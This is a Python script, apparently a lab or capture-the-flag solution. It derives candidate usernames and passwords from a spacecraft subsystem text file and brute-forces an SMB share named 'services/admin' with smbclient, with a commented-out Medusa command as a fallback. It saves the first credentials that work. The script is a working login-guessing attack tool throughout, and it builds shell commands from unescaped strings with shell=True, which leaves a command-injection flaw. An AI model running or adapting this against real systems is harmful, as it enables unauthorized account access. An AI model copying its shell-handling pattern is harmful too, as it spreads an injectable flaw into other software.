#!/usr/bin/python3

import subprocess

def getData():
    with open('shipInfo.txt', 'r') as f:
        lines = f.readlines()

    linesIndex = 0
    sectionDict = dict()
    sections = ['Telecommunications', 'Mechanisms', 'Structures', 'Electrical Power', 'Thermal Systems', 'Guidance, Navigation, & Control Systems', 'Command & Data-handling Systems', 'Propulsion']
    while True:
        if sections[0]:
            curSection = lines[linesIndex]
            sectionString = ''
            linesIndex += 2
            while lines[linesIndex].strip('\n') not in sections:
                sectionString += lines[linesIndex]
                linesIndex +=1
                if linesIndex >= len(lines):
                    break
            sectionDict[curSection] = sectionString
        if lines[linesIndex -1 ] == lines[-1]:
            break
    return sectionDict
            
def getCreds(sectionDict):
    possCreds = list()
    usernames = list()
    firstHalfPwd = list()
    secondHalfPwdNum = list()
    for k,v in sectionDict.items():
        sectionNumbers = list()
        words = v.split()
        for word in words:
            try:
                tmpNum = int(word)
            except Exception:
                continue
            else:
                sectionNumbers.append(tmpNum)
        sectionNumbers.sort()
        usernames.append(k[:4]+str(sectionNumbers[0]+sectionNumbers[-1]))
        firstHalfPwd.append(k[-5:].strip('\n'))
        for n in sectionNumbers:
            if n not in secondHalfPwdNum:
                secondHalfPwdNum.append(n)
    
    for i in range(len(usernames)):
        for s in secondHalfPwdNum:
            possCreds.append(usernames[i]+':'+str(firstHalfPwd[i])+str(s))

    return possCreds

def writeToFile(possCreds):
    ## below code to handle writing all possible credentials to file for Medusa to read + use in brute force
    f = open('possSmbCreds.txt', 'w+')
    for cred in possCreds:
        f.write(cred+'\n')
        
# medusa -u {un} -p {pwd} -h services -M smbnt  -- backup cmd 
def bruteForce(possCreds):
    #subprocess.run(f"medusa -C possCreds.txt -h services -M smbnt -O medusaSmbLog.txt",shell=True)
    for pc in possCreds:
        un,pwd = pc.split(':')
        res = subprocess.run(f"echo '{pwd}\n' | smbclient //services/admin -U {un}",shell=True, capture_output=True).stdout.decode('utf-8')
        if 'failed' not in res:
            print(f"Correct credentials found.\nUsername: {un}\nPassword: {pwd}")
            with open('smbCredentials.txt', 'w+') as f:
                f.write(f"Username: {un}\nPassword: {pwd}")
            break
        
if __name__ == '__main__':
    sectionDict = getData()
    possCreds = getCreds(sectionDict)
    writeToFile(possCreds)
    bruteForce(possCreds)
